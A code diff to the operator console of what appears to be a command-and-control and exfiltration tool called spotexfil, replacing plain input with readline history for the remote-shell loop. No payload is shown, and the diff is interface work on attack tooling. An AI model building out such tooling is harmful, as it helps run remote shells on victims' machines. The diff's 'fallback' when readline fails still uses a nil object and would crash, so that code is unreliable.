@@ -1,12 +1,12 @@
 package c2
 
 import (
-	"bufio"
 	"context"
 	"crypto/ecdh"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"os"
 	"sort"
 	"strconv"
@@ -14,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/chzyer/readline"
 	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
 	"github.com/sourcefrenchy/spotexfil/internal/shared"
@@ -77,6 +78,7 @@ type Operator struct {
 	attachedClient   string                // currently attached client_id ("" = none)
 	history          []HistoryEntry        // command/result history
 	historyFile      string                // path to persist history
+	rl               *readline.Instance    // readline for arrow key history
 
 	// Forward secrecy via X25519
 	ephPriv        *ecdh.PrivateKey
@@ -417,16 +419,35 @@ func (op *Operator) Interactive() {
 		op.sendShutdown()
 	}()
 
-	scanner := bufio.NewScanner(os.Stdin)
+	// Set up readline with history
+	histPath := ""
+	if home, err := os.UserHomeDir(); err == nil {
+		histPath = home + "/.spotexfil-readline-history"
+	}
+	rl, err := readline.NewEx(&readline.Config{
+		Prompt:          op.prompt(),
+		HistoryFile:     histPath,
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
+	})
+	if err != nil {
+		fmt.Printf("[!] Readline init failed: %v, falling back to basic input\n", err)
+	}
+	op.rl = rl
+	defer rl.Close()
 
 	for {
-		fmt.Print(op.prompt())
-		if !scanner.Scan() {
-			fmt.Println("\n[*] Exiting")
-			break
+		rl.SetPrompt(op.prompt())
+		line, err := rl.Readline()
+		if err != nil {
+			if err == readline.ErrInterrupt || err == io.EOF {
+				fmt.Println("\n[*] Exiting")
+				break
+			}
+			continue
 		}
 
-		line := strings.TrimSpace(scanner.Text())
+		line = strings.TrimSpace(line)
 		if line == "" {
 			continue
 		}
@@ -477,7 +498,7 @@ func (op *Operator) Interactive() {
 			if !op.requireAttached() {
 				continue
 			}
-			op.interactiveShell(scanner)
+			op.interactiveShell()
 		case "results":
 			results, err := op.PollResults()
 			if err != nil {
@@ -627,7 +648,7 @@ func (op *Operator) requireAttached() bool {
 // interactiveShell provides a remote shell experience.
 // Detects client OS and shows appropriate prompt ($ or >).
 // Each command is sent, then waits with animated dots until result arrives.
-func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
+func (op *Operator) interactiveShell() {
 	clientID := op.attachedClient
 	info := op.connectedClients[clientID]
 
@@ -713,18 +734,19 @@ func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
 		queueLen := len(pending)
 		mu.Unlock()
 
+		prompt := shellPrompt
 		if queueLen > 0 {
-			fmt.Printf("\033[33m[queued: %d]\033[0m %s",
+			prompt = fmt.Sprintf("\033[33m[queued: %d]\033[0m %s",
 				queueLen, shellPrompt)
-		} else {
-			fmt.Print(shellPrompt)
 		}
 
-		if !scanner.Scan() {
+		op.rl.SetPrompt(prompt)
+		line, err := op.rl.Readline()
+		if err != nil {
 			break
 		}
 
-		line := strings.TrimSpace(scanner.Text())
+		line = strings.TrimSpace(line)
 		if line == "" {
 			continue
 		}
